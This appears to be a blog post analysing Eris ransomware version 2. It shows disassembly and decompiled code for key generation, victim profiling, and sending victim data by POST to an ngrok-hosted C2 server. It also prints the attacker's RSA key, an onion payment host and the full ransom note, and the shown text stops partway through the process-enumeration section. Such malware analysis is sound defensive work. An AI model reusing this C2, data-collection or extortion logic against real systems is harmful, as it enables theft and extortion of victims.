Go Under the Hood: Eris Ransomware
lekstu.ga/posts/go-under-the-hood-eris/
October 6, 2019

Eris ransomware was first discovered in May 2019. In July it was reported by Bleeping
Computer that the malware was being distributed by the RIG exploit kit.
Here is a set of analysis notes for version two of the family. The sample used for the analysis
has the hash of
99d19dd82330a1c437a64e7ca9896ad9d914de10c4f7aa2222b1a5bc4750f692

Malware overview
Version two of the Eris ransomware are made up of six packages.
Sync package used to collect victim information and send it to the operator.
Main package
Utils
Cryptography
Anti package used for wiping 3rd party backup files
Walk package used to walk the file system
A source code layout created by redress is shown below.

1/27

Package Eris/Sync: .
File: .
init Lines: 1 to 11 (10)
GetOS Lines: 5 to 17 (12)
GetSpace Lines: 11 to 12 (1)
GetID Lines: 11 to 25 (14)
GetGeo Lines: 12 to 22 (10)
GetSyncInfo Lines: 17 to 85 (68)
machineID Lines: 25 to 27 (2)
GetSyns Lines: 85 to 451 (366)
Package main: .
File: .
init Lines: 1 to 1 (0)
Init Lines: 30 to 46 (16)
main Lines: 46 to 236 (190)
mainfunc1 Lines: 165 to 166 (1)
ReadFileA Lines: 236 to 246 (10)
LineCountA Lines: 246 to 250 (4)
Package Eris/Utils: .
File: .
init Lines: 1 to 1 (0)
RandStringBytes Lines: 18 to 35 (17)
Kill Lines: 35 to 64 (29)
initializers Lines: 43 to 44 (1)
Execute Lines: 64 to 83 (19)
(*WindowsProcess)Pid Lines: 78 to 82 (4)
(*WindowsProcess)PPid Lines: 82 to 86 (4)
GetDrive Lines: 83 to 107 (24)
(*WindowsProcess)Executable Lines: 86 to 90 (4)
newWindowsProcess Lines: 90 to 122 (32)
Contains Lines: 107 to 119 (12)
Exists Lines: 119 to 130 (11)
processes Lines: 122 to 127 (5)
Wrap Lines: 130 to 139 (9)
Package Eris/Cryptography: .
File: .
init Lines: 1 to 1 (0)
RC4Encrypt Lines: 5 to 15 (10)
RSAGenerateKey Lines: 15 to 43 (28)
Lock Lines: 23 to 57 (34)
RSAEncrypt Lines: 43 to 46 (3)
Package Eris/Anti: .
File: .
init Lines: 1 to 10 (9)
WipeBackup Lines: 11 to 15 (4)
Package Eris/Walk: .
File: .
init Lines: 1 to 116 (115)
Check Lines: 10 to 18 (8)
WalkDirectores Lines: 18 to 130 (112)
WalkComputer Lines: 130 to 133 (3)
WalkComputerfunc1 Lines: 133 to 142 (9)
WalkComputerfunc2 Lines: 142 to 143 (1)

2/27

Technical breakdown
Loading import functions
The malware loads some additional imports in its init function. These imports are later used
to list all the running processes.

3/27

(fcn) sym.Eris_Utils_init.ializers
0x0053df90 mov ecx, dword fs:[0x14]
0x0053df97 mov ecx, dword [ecx]
0x0053df9d cmp esp, dword [ecx + 8]
0x0053dfa0 jbe 0x53e101
0x0053dfa6 sub esp, 0x10
0x0053dfa9 lea eax, str_kernel32.dll ; "kernel32.dll"
0x0053dfaf mov dword [esp], eax
0x0053dfb2 mov dword [var_4h], 0xc
0x0053dfba call sym.syscall.NewLazyDLL
0x0053dfbf mov eax, dword [0x88be50]
0x0053dfc5 mov ecx, dword [var_8h]
0x0053dfc9 test eax, eax
0x0053dfcb jne 0x53e0ef
0x0053dfd1 mov dword [sym.hKernel32.dll], ecx
0x0053dfd7 mov dword [esp], ecx
0x0053dfda lea eax, [0x675b84] ; "CloseHandle"
0x0053dfe0 mov dword [var_4h], eax
0x0053dfe4 mov dword [var_8h], 0xb
0x0053dfec call sym.syscall___LazyDLL_.NewProc
0x0053dff1 mov eax, dword [0x88be50]
0x0053dff7 mov ecx, dword [var_ch]
0x0053dffb test eax, eax
0x0053dffd jne 0x53e0dd
0x0053e003 mov dword [sym.pCloseHandle], ecx
0x0053e009 mov eax, dword [sym.hKernel32.dll]
0x0053e00f mov dword [esp], eax
0x0053e012 lea eax, [0x67ae16] ; "CreateToolhelp32Snapshot"
0x0053e018 mov dword [var_4h], eax
0x0053e01c mov dword [var_8h], 0x18
0x0053e024 call sym.syscall___LazyDLL_.NewProc
0x0053e029 mov eax, dword [0x88be50]
0x0053e02f mov ecx, dword [var_ch]
0x0053e033 test eax, eax
0x0053e035 jne 0x53e0cb
0x0053e03b mov dword [sym.pCreateToolhelp32Snapshot], ecx
0x0053e041 mov eax, dword [sym.hKernel32.dll]
0x0053e047 mov dword [esp], eax
0x0053e04a lea eax, [0x6772a1] ; "Process32FirstW"
0x0053e050 mov dword [var_4h], eax
0x0053e054 mov dword [var_8h], 0xf
0x0053e05c call sym.syscall___LazyDLL_.NewProc
0x0053e061 mov eax, dword [0x88be50]
0x0053e067 mov ecx, dword [var_ch]
0x0053e06b test eax, eax
0x0053e06d jne 0x53e0bc
0x0053e06f mov dword [sym.pProcess32FirstW], ecx
0x0053e075 mov eax, dword [sym.hKernel32.dll]
0x0053e07b mov dword [esp], eax
0x0053e07e lea eax, [0x676d3a] ; "Process32NextW"
0x0053e084 mov dword [var_4h], eax
0x0053e088 mov dword [var_8h], 0xe
0x0053e090 call sym.syscall___LazyDLL_.NewProc
0x0053e095 mov eax, dword [0x88be50]
0x0053e09b mov ecx, dword [var_ch]

4/27

0x0053e09f
0x0053e0a1
0x0053e0a3
0x0053e0a9
0x0053e0ac

test eax, eax
jne 0x53e0ad
mov dword [sym.pProcess32NextW], ecx
add esp, 0x10
ret

Encryption key generation
The malware uses the following struct to store the keys generated for the victim.
type main.Session struct {
Extension string
PUBLIC_KEY []uint8
E_PRIVATE_KEY []uint8
}

It is also stored encrypted on the disk. The following snippet shows the generation of file path
to the files.
0x005fe3ff
0x005fe405
0x005fe408
0x005fe410
0x005fe415
0x005fe419
0x005fe41d
0x005fe420
0x005fe424
0x005fe429
0x005fe42d
0x005fe438
0x005fe443
0x005fe44e
0x005fe459
0x005fe45f
0x005fe466
0x005fe46d
0x005fe474
0x005fe47a
0x005fe481
0x005fe487
0x005fe48a
0x005fe492
0x005fe499
0x005fe49d
0x005fe4a5
0x005fe4ad

lea eax, [0x6770d0] ; "ALLUSERSPROFILE"
mov dword [esp], eax
mov dword [var_4h], 0xf
call fcn.os.Getenv
mov eax, dword [var_ch]
mov ecx, dword [var_8h]
mov dword [esp], ecx
mov dword [var_4h], eax
call fcn.runtime.convTstring
mov eax, dword [var_8h]
mov dword [var_198h], 0
mov dword [var_19ch], 0
mov dword [var_1a0h], 0
mov dword [var_1a4h], 0
lea ecx, sym.type.string
mov dword [var_198h], ecx
mov dword [var_19ch], eax
mov dword [var_1a0h], ecx
lea eax, [0x6cec98] ; "00000000.pky"
mov dword [var_1a4h], eax
lea eax, [0x6745d6] ; "%s\%s"
mov dword [esp], eax
mov dword [var_4h], 5
lea edx, [var_198h]
mov dword [var_8h], edx
mov dword [var_ch], 2
mov dword [var_10h], 2
call fcn.fmt.Sprintf

The data is stored in these three files:
%ALLUSERSPROFILE%\00000000.pky
%ALLUSERSPROFILE%\00000000.eky
%ALLUSERSPROFILE%\00000000.ext
5/27

If files already exists, they are used instead of generating a new key.
0x005fe65a
0x005fe661
0x005fe664
0x005fe66b
0x005fe66f
0x005fe674
0x005fe679
0x005fe67b
0x005fe681
0x005fe688
0x005fe68b
0x005fe692
0x005fe696
0x005fe69b
0x005fe69f
0x005fe6a3
0x005fe6a7
0x005fe6ab

mov edx, dword [pky_path_str]
mov dword [esp], edx
mov ebx, dword [pky_path_str_len]
mov dword [var_4h], ebx
call fcn.Eris_Utils.Exists
movzx eax, byte [var_8h]
test al, al
je 0x5ff0c4
mov eax, dword [pky_path_str]
mov dword [esp], eax
mov eax, dword [pky_path_str_len]
mov dword [var_4h], eax
call fcn.main.ReadFileA
mov eax, dword [var_14h]
mov ecx, dword [var_10h]
mov edx, dword [var_8h]
mov ebx, dword [var_ch]
test eax, eax

The victim’s private key is encrypted with the threat actor’s public key. The encrypted blob is
further encrypted RC4.

6/27

0x005ff212
0x005ff218
0x005ff21d
0x005ff224
0x005ff227
0x005ff22f
0x005ff237
0x005ff23b
0x005ff243
0x005ff24b
0x005ff250
0x005ff254
0x005ff25b
0x005ff25f
0x005ff266
0x005ff26a
0x005ff271
0x005ff278
0x005ff27b
0x005ff282
0x005ff286
0x005ff28d
0x005ff291
0x005ff298
0x005ff29c
0x005ff2a4
0x005ff2ac
0x005ff2b1
0x005ff2b5
0x005ff2bc
0x005ff2c0
0x005ff2c7
0x005ff2cb

lea esi, [0x68736a] ; Public key
call fcn.0044d9f0
mov ecx, dword [var_174h]
mov dword [esp], ecx
mov dword [var_4h], 0x80
mov dword [var_8h], 0x80
mov dword [var_ch], eax
mov dword [var_10h], 0x1c3
mov dword [var_14h], 0x1c3
call fcn.Eris_Cryptography.RSAEncrypt
mov eax, dword [var_20h]
mov dword [var_8ch], eax
mov ecx, dword [var_1ch]
mov dword [var_84h], ecx
mov edx, dword [var_18h]
mov dword [var_140h], edx
mov ebx, dword [var_148h]
mov dword [esp], ebx
mov ebx, dword [var_98h]
mov dword [var_4h], ebx
mov ebx, dword [var_9ch]
mov dword [var_8h], ebx
mov ebx, dword [var_174h]
mov dword [var_ch], ebx
mov dword [var_10h], 0x80
mov dword [var_14h], 0x80
call fcn.Eris_Cryptography.RC4Encrypt
mov eax, dword [var_1ch]
mov dword [var_88h], eax
mov ecx, dword [var_18h]
mov dword [var_13ch], ecx
mov edx, dword [var_20h]
mov dword [var_90h], edx

Threat actor’s key:
--BEGIN PUBLIC KEY----MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAiVFawLHK0Gld4XUYi7Wq
1ura1N78VvOuW4kvH/yDYOajqRx7nqFB2mokTDqHa5phT48FtLMbuFc+j39YnZBa
jjSN2zDaC13vDRNXfiW41yJAtMAJXh17cE/lAdAgEUQdYwJPVHfDuCPGGO5Dn+hg
xehdJvIiNFbKCCFP7EojDH0kK1h9p8TngwqHySBNLUADKeONKPk171oe+5isEnbF
VjBcinGF13V/CRBKXsrH2z7BCWtyZTG+MWXRqUOn2mYOFgt4ZNOe4U0nz6/A1YmJ
V8NybH2vHp4Bs/ov7RcnQUvW0BwG0/xp6YDSaOt59A0rEbJE0+J3NTlEVPesehOr
xwIDAQAB
-----END PUBLIC KEY-----

The malware also looks for the existence of the file: C:\eris.was

7/27

0x005fe7f2
0x005fe7f8
0x005fe7fb
0x005fe803
0x005fe808
0x005fe80d
0x005fe80f
0x005fe815
0x005fe817
0x005fe81e
0x005fe825
0x005fe828
0x005fe82b
0x005fe82e
0x005fe831
0x005fe835
0x005fe839

lea eax, [0x675b79] ; "C:\eris.was"
mov dword [esp], eax
mov dword [var_4h], 0xb
call fcn.Eris_Utils.Exists
movzx eax, byte [var_8h]
test al, al
jne 0x5ff05d
xor eax, eax
mov dword [var_94h], eax
mov ecx, dword [session]
mov edx, dword [ecx + 0x14]
mov ebx, dword [ecx + 0x18]
mov ebp, dword [ecx + 0x1c]
mov dword [esp], edx
mov dword [var_4h], ebx
mov dword [var_8h], ebp
call fcn.Eris_Sync.GetSyns

Victim information
The Eris malware collects information about the infected system. The data is populated into
the structure shown below.
type Struct.BotJson struct{
UID string
SID string
Kind int
Storage []struct {
Alphabet string `json:"alphabet"`
Label string `json:"label"`
Type int `json:"type"`
Free int64 `json:"free"`
Full int64 `json:"full"`
}
Extension string
OS string
UserName string
PCName string
Country string
City string
IP string
Org string
Stage1 string
Stage2 string
Date int64
}

Username is collected from the environment variable and the host name is retrieved via the
standard library function:

8/27

0x005f8d21
0x005f8d27
0x005f8d2a
0x005f8d32
0x005f8d37
0x005f8d3b
0x005f8d3f
0x005f8d46
0x005f8d4d
0x005f8d4e
0x005f8d53
0x005f8d56
0x005f8d5a
0x005f8d5e
0x005f8d60
0x005f8d66
0x005f8d6c
0x005f8d73
...
0x005f8f7e
0x005f8f85
0x005f8f8c

lea ecx, [0x67505a] ; "USERNAME"
mov dword [esp], ecx
mov dword [var_4h], 8
call fcn.os.Getenv
mov ecx, dword [var_8h]
mov edx, dword [var_ch]
mov dword [username_str], ecx
mov dword [username_str_len], edx
nop
call fcn.os.hostname
mov ecx, dword [esp]
mov edx, dword [var_4h]
mov ebx, dword [var_8h]
test ebx, ebx
je 0x5f8f7e
lea eax, [0x674dca] ; "unknown"
mov dword [hostname_str], eax
mov dword [hostname_str_len], 7
mov dword [hostname_str], ecx
mov dword [hostname_str_len], edx
jmp 0x5f8d7e

The ID of the machine is generated from the machine ID. First the GUID is fetched from the
registry. A summary of the Eris_Sync.machineID function is shown below.
0x005f8a10 "SOFTWARE\Microsoft\Cryptography"
0x005f8a2a call sym.golang.org_x_sys_windows_registry.OpenKey
0x005f8a5c call sym.runtime.deferproc
0x005f8a63 cjmp 0x005f8b0d
0x005f8a6f cjmp 0x005f8ae7
0x005f8a78 "MachineGuid"
0x005f8a8a call sym.golang.org_x_sys_windows_registry_Key.GetStringValue
0x005f8aa1 cjmp 0x005f8ac5
0x005f8abc call sym.runtime.deferreturn
0x005f8ac5:
0x005f8ade call sym.runtime.deferreturn
0x005f8ae7:
0x005f8b04 call sym.runtime.deferreturn
0x005f8b0d:
0x005f8b0e call sym.runtime.deferreturn
0x005f8b17:
0x005f8b17 call sym.runtime.morestack_noctxt
0x005f8b1c jmp 0x005f89d0
0x005f8b1c sym.Eris_Sync.machineID

The GUID is hashed with SHA1 and the hex-encoded string is used as the ID. If no GUID is
found, the ID is generated from a set of random bytes. Below is a Ghidra decompiled
representation of the function.

9/27

void sym.Eris_Sync.GetID(undefined4 uParm1, undefined4 uParm2)
{
uint32_t *puVar1;
int32_t iVar2;
int32_t iVar3;
int32_t in_FS_OFFSET;
undefined4 *in_stack_ffffffa4;
undefined4 *in_stack_ffffffa8;
undefined4 *puVar4;
undefined4 *in_stack_ffffffac;
undefined4 *in_stack_ffffffb0;
int32_t in_stack_ffffffb4;
uint32_t in_stack_ffffffb8;
uint32_t uVar5;
int32_t in_stack_ffffffbc;
undefined4 uStack56;
int32_t iStack52;
undefined4 uStack48;
sym.Eris_Sync.machineID();
puVar4 = in_stack_ffffffa8;
if ((in_stack_ffffffac != (undefined4 *)0x0) && (in_stack_ffffffa8 == (undefined4
*)0x0)) {
// If no GUID, generate random string.
in_stack_ffffffa4 = in_stack_ffffffa8;
in_stack_ffffffa8 = in_stack_ffffffac;
sym.Eris_Utils.RandStringBytes(0x20);
puVar4 = in_stack_ffffffa4;
}
sym.runtime.newobject(sym.type.sha1.digest);
*puVar4 = 0x67452301;
puVar4[1] = 0xefcdab89;
puVar4[2] = 0x98badcfe;
puVar4[3] = 0x10325476;
puVar4[4] = 0xc3d2e1f0;
puVar4[0x15] = 0;
puVar4[0x16] = 0;
puVar4[0x17] = 0;
sym.runtime.stringtoslicebyte(0, in_stack_ffffffa4, in_stack_ffffffa8);
sym.crypto_sha1___digest_.Write(puVar4, in_stack_ffffffb0, in_stack_ffffffb4,
in_stack_ffffffb8);
sym.runtime.newobject(sym.type._9_uint8);
*in_stack_ffffffb0 = 0x6e617247;
*(undefined4 *)((int32_t)in_stack_ffffffb0 + 1) = 0x646e6172;
*(undefined4 *)((int32_t)in_stack_ffffffb0 + 5) = 0x73697245;
sym.crypto_sha1___digest_.Write(puVar4, in_stack_ffffffb0, 9, 9);
sym.crypto_sha1___digest_.Sum(puVar4, 0, 0, 0);
iVar2 = in_stack_ffffffb4;
uVar5 = in_stack_ffffffb8;
iVar3 = in_stack_ffffffbc;
sym.crypto_sha1___digest_.Sum(puVar4, 0, 0, 0);
if (7 < uVar5) {
iVar2 = iVar2 + (-(iVar3 + -8) >> 0x1f & 8U);
sym.golang.org_x_crypto_pbkdf2.Key(in_stack_ffffffb4, in_stack_ffffffb8,
in_stack_ffffffbc, iVar2, uVar5 - 8,

10/27

iVar3 + -8, 0x7e4, 8, 0x68ae74);
iVar3 = iStack52 << 1;
sym.runtime.makeslice(sym.type.uint8, iVar3, iVar3);
sym.encoding_hex.Encode(iVar2, iVar3, iVar3, uStack56,
iStack52, uStack48);
sym.runtime.slicebytetostring(0, iVar2, iVar3, iVar3);
return;
}
sym.runtime.panicslice();
do {
invalidInstructionException();
} while( true );
}

Disk space is gathered from all disks attached. First the malware checks which drive letters
exist.
0x005f7f92
0x005f7f95
0x005f7f9b
0x005f7f9f
0x005f7fa3
0x005f7fa7
0x005f7faa
0x005f7fad
0x005f7fb1
0x005f7fb4
0x005f7fb8
0x005f7fbd
0x005f7fc1
0x005f7fc5
0x005f7fcc
0x005f7fd0
0x005f7fd4
0x005f7fda
0x005f7fde
0x005f7fe6
0x005f7feb
0x005f7fef
0x005f7ff3
0x005f7ff7
0x005f7ffe
0x005f8001
0x005f8005
0x005f800a
0x005f800e
0x005f8012
0x005f8015
0x005f8019
0x005f801e
0x005f8023

cmp ecx, 0x1a ; 26
jge 0x5f80c7
mov dword [var_3ch], ecx
mov dword [var_4ch], ebx
lea eax, [var_64h]
mov dword [esp], eax
lea eax, [ecx + 0x41]
mov dword [var_4h], eax
sar eax, 0x1f
mov dword [var_8h], eax
call fcn.runtime.intstring
mov eax, dword [var_10h]
mov ecx, dword [var_ch]
mov dword [esp], 0
mov dword [var_4h], ecx
mov dword [var_8h], eax
lea eax, [0x673e20] ; ":\"
mov dword [var_ch], eax
mov dword [var_10h], 2
call fcn.runtime.concatstring2
mov eax, dword [var_18h]
mov dword [var_50h], eax
mov ecx, dword [var_14h]
mov dword [var_474h], ecx
mov dword [esp], ecx
mov dword [var_4h], eax
call fcn.os.Stat
mov eax, dword [var_10h]
mov ecx, dword [var_14h]
mov dword [esp], eax
mov dword [var_4h], ecx
call fcn.os.IsNotExist
movzx eax, byte [var_8h]
test al, al

The disk space is gotten by calling GetVolumeInformationW .

11/27

0x005f82e9
0x005f82ef
0x005f82f3
0x005f82fb
0x005f8300
0x005f8304
0x005f8308
0x005f830f
0x005f8312
0x005f8316
0x005f831a
0x005f831f
0x005f8323
0x005f832a
0x005f8331
0x005f8338
0x005f833c
0x005f8343
0x005f8347
0x005f834e
0x005f8352
0x005f8359
0x005f835d
0x005f8364
0x005f8368
0x005f836b
0x005f8373
0x005f837a
0x005f837e
0x005f8385
0x005f8389
0x005f8391
0x005f8398
0x005f839c
0x005f83a3
0x005f83a7
0x005f83ae
0x005f83b2
0x005f83b9
0x005f83bd
0x005f83c5
0x005f83cd

lea edx, [0x67983a] ; "GetVolumeInformationW"
mov dword [var_4h], edx
mov dword [var_8h], 0x15
call fcn.syscall.GetProcAddress
mov edx, dword [var_ch]
mov dword [pGetVolumeInformationW], edx
mov ebx, dword [var_470h]
mov dword [esp], ebx
mov ebp, dword [var_38h]
mov dword [var_4h], ebp
call fcn.syscall.StringToUTF16Ptr
mov edx, dword [var_8h]
mov dword [var_498h], edx
lea edx, [var_266h]
mov dword [var_494h], edx
lea ebx, [var_54h]
mov dword [var_490h], ebx
lea ebx, [var_58h]
mov dword [var_48ch], ebx
lea ebx, [var_5ch]
mov dword [var_488h], ebx
lea ebx, [var_68h]
mov dword [var_484h], ebx
mov ebx, dword [pGetVolumeInformationW]
mov dword [esp], ebx
mov dword [var_4h], 8
mov ebx, dword [var_498h]
mov dword [var_8h], ebx
mov ebx, dword [var_494h]
mov dword [var_ch], ebx
mov dword [var_10h], 0x105
mov ebx, dword [var_490h]
mov dword [var_14h], ebx
mov ebx, dword [var_48ch]
mov dword [var_18h], ebx
mov ebx, dword [var_488h]
mov dword [var_1ch], ebx
mov ebx, dword [var_484h]
mov dword [var_20h], ebx
mov dword [var_24h], 0x105
mov dword [var_28h], 0
call fcn.syscall.Syscall9

12/27

0x005f80fa
0x005f8101
0x005f8104
0x005f8108
0x005f810c
0x005f8111
0x005f8115
0x005f811c
0x005f8122
0x005f8125
0x005f812a
0x005f812e
0x005f8135
0x005f8137
0x005f813e
0x005f8141
0x005f8148
0x005f814b
0x005f8152
0x005f8155
0x005f815c
0x005f815f
0x005f8163
0x005f816b
0x005f8173
0x005f8178
0x005f817f
0x005f8182
0x005f8186
0x005f818a
0x005f818f
0x005f8193
0x005f8196

mov eax, dword [var_470h]
mov dword [esp], eax
mov ecx, dword [var_38h]
mov dword [var_4h], ecx
call fcn.syscall.StringToUTF16Ptr
mov eax, dword [var_8h]
mov dword [var_49ch], eax
lea ecx, sym.type._4_uintptr
mov dword [esp], ecx
call fcn.runtime.newobject
mov eax, dword [var_4h]
mov ecx, dword [var_49ch]
mov dword [eax], ecx
mov ecx, dword [var_4ach]
mov dword [eax + 4], ecx
mov ecx, dword [var_4a8h]
mov dword [eax + 8], ecx
mov ecx, dword [var_4b0h]
mov dword [eax + 0xc], ecx
mov ecx, dword [pGetDiskFreeSpaceExW]
mov dword [esp], ecx
mov dword [var_4h], eax
mov dword [var_8h], 4
mov dword [var_ch], 4
call fcn.syscall___Proc_.Call
mov eax, dword [var_470h]
mov dword [esp], eax
mov eax, dword [var_38h]
mov dword [var_4h], eax
call fcn.syscall.StringToUTF16Ptr
mov eax, dword [var_8h]
mov dword [esp], eax
call fcn.golang.org_x_sys_windows.GetDriveType

The information for each drive is stored in a slice of structs as shown below.
Returns:
[]struct {
Alphabet string `json:"alphabet"`
Label string `json:"label"`
Type int `json:"type"`
Free int64 `json:"free"`
Full int64 `json:"full"`
}

Operating information is collected from the registry key ProductName . Below is a Ghidra
decompiled representation of the function.

13/27

void fcn.Eris_Sync.GetOS(undefined4 uParm1, undefined4 uParm2)
{
while (puVar1 = (uint32_t *)(**(int32_t **)(in_FS_OFFSET + 0x14) + 8),
register0x00000010 < (undefined *)*puVar1 || (undefined
*)register0x00000010 == (undefined *)*puVar1) {
fcn.runtime.morestack_noctxt();
}
uParm1 = 0;
uParm2 = 0;
uVar3 = 0xf003f;
key = fcn.golang.org_x_sys_windows_registry.OpenKey(0x80000002,
"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", 0xf003f);
fcn.runtime.deferproc(0xc, 0x68afc4, uStack24);
if (key != 0) {
if (iStack20 == 0) {
prod_name = fcn.golang.org_x_sys_windows_registry_Key.GetStringValue(key,
"ProductName");
uParm1 = uVar3;
if (prod_name != 0) {
fcn.runtime.deferreturn();
return prod_name;
}
}
fcn.runtime.deferreturn();
return "unknown";
}

Geo-location is gathered by performing a request to extreme-ip-lookup.com
0x005f84c4
0x005f84ca
0x005f84cd
0x005f84d2
0x005f84d6
0x005f84da
0x005f84e1
0x005f84e8
0x005f84ee
0x005f84f1
0x005f84f6
0x005f84fa
0x005f84fe
0x005f8504
0x005f8507
0x005f850f
0x005f8515
0x005f8519
0x005f8521
0x005f8529
0x005f8531
0x005f8536

lea ecx, sym.type.http.Client
mov dword [esp], ecx
call fcn.runtime.newobject
mov ecx, dword [var_4h]
mov dword [var_34h], ecx
mov dword [ecx + 0x14], 0x540be400
mov dword [ecx + 0x18], 2
lea edx, sym.type.Struct.Geo
mov dword [esp], edx
call fcn.runtime.newobject
mov ecx, dword [var_4h]
mov dword [var_44h], ecx
lea edx, [0x673fa6] ; "GET"
mov dword [esp], edx
mov dword [var_4h], 3
lea edx, [0x67f274] ; "http://extreme-ip-lookup.com/json/
mov dword [var_8h], edx
mov dword [var_ch], 0x22
mov dword [var_10h], 0
mov dword [var_14h], 0
call fcn.net_http.NewRequest
mov ecx, dword [var_18h]

User agent used: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
(KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36

14/27

Data returned from the service:
type Struct.Geo struct {
BusinessName
string
BusinessWebsite string
City
string
Continent
string
Country
string
CountryCode
string
IPName
string
IPType
string
Isp
string
Lat
string
Lon
string
Org
string
Query
string
Region
string
Status
string
}

The data is sent to the C2 server located at d9d120a3.ngrok.io . The malware tries three
times.
0x005fe815
.-> 0x005fe817
:
0x005fe81e
:
0x005fe825
:
0x005fe828
:
0x005fe82b
:
0x005fe82e
:
0x005fe831
:
0x005fe835
:
0x005fe839
:
0x005fe83e
:
0x005fe842
,==< 0x005fe844
|:
0x005fe846
|:
0x005fe84d
|:
0x005fe84e
|`=< 0x005fe851
`--> 0x005fe853

xor eax, eax
mov dword [var_94h], eax
mov ecx, dword [session]
mov edx, dword [ecx + 0x14]
mov ebx, dword [ecx + 0x18]
mov ebp, dword [ecx + 0x1c]
mov dword [esp], edx
mov dword [var_4h], ebx
mov dword [var_8h], ebp
call fcn.Eris_Sync.GetSyns
mov eax, dword [var_18h]
test eax, eax
je 0x5fe853
mov eax, dword [var_94h]
inc eax
cmp eax, 3
jle 0x5fe817
mov eax, dword [session]

Summary of function that sends the data:

15/27

0x005f8fa0:
0x005f8fb9 sym.type.http.Client
0x005f8fc2 call fcn.runtime.newobject
0x005f8ffd sym.type.string
0x005f9007 "d9d120a3.ngrok.io"
0x005f9015 "redirect"
0x005f901f "https://%s/%"
0x005f9048 call fcn.fmt.Sprintf
0x005f905e sym.type.bytes.Buffer
0x005f9067 call fcn.runtime.newobject
0x005f9086 cjmp 0x005f92c5
0x005f9092:
0x005f9092 "POST"
0x005f90c1 call fcn.net_http.NewRequest
0x005f90d6 sym.type.Struct.Response
0x005f90df call fcn.runtime.newobject
0x005f90ee cjmp 0x005f9118
0x005f90f0:
0x005f9118:
0x005f9129 "User-Agent"
0x005f913a call fcn.net_textproto.CanonicalMIMEHeaderKey
0x005f914f sym.type._1_string
0x005f9158 call fcn.runtime.newobject
0x005f9174 cjmp 0x005f92b5
0x005f917a "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like
Gecko) Chrome/58.0.3029.110 Safari/537.36"
0x005f9182:
0x005f9182 sym.type.textproto.MIMEHeader
0x005f91a3 call fcn.runtime.mapassign_faststr
0x005f91c2 cjmp 0x005f92a7
0x005f91ce:
0x005f91de call fcn.net_http___Client_.do
0x005f91ed cjmp 0x005f91f8
0x005f91ef:
0x005f91f3 jmp 0x005f90f0
0x005f91f8:
0x005f91fe sym.type.io.Reader
0x005f920f call fcn.runtime.convI2I
0x005f9234 call fcn.io_ioutil.readAll
0x005f924b cjmp 0x005f91ef
0x005f9258 sym.type._Struct.Response
0x005f926a call fcn.encoding_json.Unmarshal

The server response with the following data in JSON:
type Struct.Response struct {
Response string
Code
int
}

Ransomware initialization
Before encrypting files, the malware prepares the ransom note. The note is shown below.
The malware performs the following operations on the note template:
16/27

Replace {version} with 2.0.3
Replace {host} with
[[epaybfvlutydks6fpfwtwoe2fsph6vve2obgv6qbhyuqwkecbhsf7nyd.onion]]

Replace {id} with the id.
Replace {identification} with base58 encoded encrypted key.

17/27

***
***\x0d
*** READ THIS FILE CAREFULLY TO RECOVERY YOUR FILES ***\x0d
***
***\x0d
\x0d
\x0d
\x0d
ALERT! \x0d
ALL OF YOUR FILES HAVE BEEN ENCRYPTED BY "ERIS RANSOMWARE" v{version}!\x0d
\x0d
Welcome to Eris System Security Encryption Program!\x0d
\x0d
Keeping strong security for our clients in mind, we have implemented Strong
Encryption Algorithm for securing the system.\x0d
\x0d
To personally update regarding the available decryption software and payment methods.
Follow the steps below to access the payment page.\x0d
\x0d
\x0d
Follow the steps below to access payment page.\x0d
\x0d
1. Download and install Tor browser from here:\x0d
URL - https://www.torproject.org/download/\x0d
\x0d
2. Visit page below using Tor browser:\x0d
URL - http://{host}/{id}\x0d
\x0d
3. Enter your "ERIS IDENTIFICATION". (You can find it in below)\x0d
\x0d
4. Follow the next steps(instructions) displayed on the page for successful
decryption.\x0d
\x0d
Note: \x0d
We only accept payments via Bitcoin (BTC)!\x0d
\x0d
\x0d
ERIS IDENTIFICATION:\x0d
\x0d
{identification}\x0d
\x0d
\x0d
* IF YOU NOT FOLLOW INSTRUCTIONS IN PAYMENT PAGE MORE THAN 7 DAYS!,\x0d
YOUR CANNOT ACCESS TO PAYMENT PAGE OR YOUR FILES ANYMORE!\x0d
\x0d
* IN CASE OF FOLLOWING OUR INSTRUCTION,\x0d
FAST AND EASILY EVERYTHING IS BACK TO NORMAL LIKE THAT NEVER HAPPENED!\x0d
BUT IF YOU USE OTHER METHODS (THAT NEVER EVER HELPS) YOU JUST DESTROY EVERYTHING
FOR GOODNESS!\x0d
\x0d
---------------------------------\x0d
* DO NOT MODIFY ENCRYPTED FILE(S)\x0d
* DO NOT MOVE ENCRYPTED FILES\x0d
* DO NOT USE RECOVERY SOFTWARE(S)\x0d
---------------------------------

Process enumeration
18/27

The malware enumerates all the running processes:
0x0053d024
0x0053d02a
0x0053d02d
0x0053d031
0x0053d039
0x0053d041
0x0053d046
0x0053d04a
0x0053d04c
0x0053d052
0x0053d056
0x0053d05c
0x0053d05f
0x0053d064
0x0053d068
0x0053d06c
0x0053d06e
0x0053d075
0x0053d07b
0x0053d07f
0x0053d085
0x0053d089
0x0053d08d
0x0053d095
0x0053d09d
0x0053d0a2
0x0053d0a4
0x0053d0aa
0x0053d0b0
0x0053d0b3
0x0053d0b8
0x0053d0bc
0x0053d0c0
0x0053d0c6
0x0053d0cc
0x0053d0cf
0x0053d0d4
0x0053d0d8
0x0053d0dc
0x0053d0de
0x0053d0e2
0x0053d0e5
0x0053d0eb
0x0053d0ee
0x0053d0f2
0x0053d0fa
0x0053d102
0x0053d107

mov ecx, dword [sym.pCreateToolhelp32Snapshot]
mov dword [esp], ecx
mov dword [var_4h], eax
mov dword [var_8h], 2
mov dword [var_ch], 2
call fcn.syscall___LazyProc_.Call
mov eax, dword [var_10h]
test eax, eax
jb 0x53d326
mov dword [var_34h], eax
lea eax, sym.type._1_uintptr
mov dword [esp], eax
call fcn.runtime.newobject
mov eax, dword [var_4h]
mov ecx, dword [var_34h]
mov dword [eax], ecx
mov dword [esp], 0x20
lea edx, [0x68b3dc]
mov dword [var_4h], edx
mov edx, dword [sym.pCloseHandle]
mov dword [var_8h], edx
mov dword [var_ch], eax
mov dword [var_10h], 1
mov dword [var_14h], 1
call fcn.runtime.deferproc
test eax, eax
jne 0x53d31c
lea eax, sym.type.Utils.PROCESSENTRY32
